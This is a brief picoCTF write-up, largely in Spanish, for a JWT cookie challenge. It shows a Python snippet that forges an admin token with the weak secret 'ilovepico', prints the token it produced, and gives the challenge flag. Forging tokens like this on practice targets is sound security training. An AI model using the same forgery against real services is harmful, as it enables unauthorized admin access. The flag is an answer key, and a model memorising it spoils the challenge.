
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090


Hints:
What is that cookie?

Have you heard of JWT?



**Solución 1**

```
En python


import jwt


adminJWT=jwt.encode({"user":"admin"}, "ilovepico",algorithm="HS256")

print(adminJWT)

PS C:\Users\Ivanesco\Documents\Frameworks\ultimo_respaldo\django> & "C:/Program Files/python.exe" c:/Users/Ivanesco/Documents/Seguridad_Redes/Python/JWT.py
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.di2J1a0H3IhZtGmIfw7ltVq7sZL2orh8WIP1isDkgdw


```

"Nota": No me sirvió la herramienta de JWT.io, pero usando python funcionó y con el editor de cookies

## Respuesta: **picoCTF{jawt_was_just_what_you_thought_f859ab2f}**